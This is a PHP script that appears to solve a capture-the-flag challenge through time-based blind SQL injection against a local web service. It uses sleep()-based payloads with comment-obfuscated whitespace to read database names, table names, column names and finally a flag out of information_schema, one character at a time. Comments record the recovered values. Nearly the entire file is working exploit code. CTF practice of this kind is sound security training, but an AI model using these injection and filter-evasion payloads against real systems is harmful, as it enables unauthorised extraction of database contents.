<?php

$result = "";
$j = 1;
while (true) {
	$found = false;
	for ($i = 0x80; $i > 0x20; $i--) {
		$url = 'http://127.0.0.1:10003/?%27^if(ASCII(substr((SELECT/**/schema%20name/**/FROM/**/information%20schema/*[*/.schemata/**/limit/**/0,1),'.$j.',1))>'.$i.',sleep(1),sleep(0))^0^%27=1&release';
		// information_schema
		$url = 'http://127.0.0.1:10003/?%27^if(ASCII(substr((SELECT/**/schema%20name/**/FROM/**/information%20schema/*[*/.schemata/**/limit/**/1,1),'.$j.',1))>'.$i.',sleep(1),sleep(0))^0^%27=1';
		// supersqli
		$url = 'http://127.0.0.1:10003/?%27^if(ASCII(substr((SELECT/**/table%20name/**/FROM/**/information%20schema/*[*/.tables/**/limit/**/60,1),'.$j.',1))>'.$i.',sleep(1),sleep(0))^0^%27=1';
		// words
		$url = 'http://127.0.0.1:10003/?%27^if(ASCII(substr((SELECT/**/table%20name/**/FROM/**/information%20schema/*[*/.tables/**/limit/**/59,1),'.$j.',1))>'.$i.',sleep(1),sleep(0))^0^%27=1';
		// f8bfef214dd55919bd72ddee388c9b71
		$url = 'http://127.0.0.1:10003/?%27^if(ASCII(substr((SELECT/**/column%20name/**/FROM/**/information%20schema/*[*/.columns/**/limit/**/591,1),'.$j.',1))>'.$i.',sleep(1),sleep(0))^0^%27=1';
		// flag
		$url = 'http://127.0.0.1:10003/?%27^if(ASCII(substr((SELECT/**/flag/**/FROM/**/f8bfef214dd55919bd72ddee388c9b71),'.$j.',1))>'.$i.',sleep(1),sleep(0))^0^%27=1';
		// flag{a06a07ae-7707-4d0e-b9ce-412935574b9d}
		$start = time();
		file_get_contents($url);
		$end = time();
		echo $i."   \r";
		$x = $end - $start;
		if ($x > 1) {
			$result.=chr($i + 1);
			echo "\n".$result."\n";
			$found = true;
			break;
		}
	}
	if (!$found) {
		break;
	}
	$j++;
}

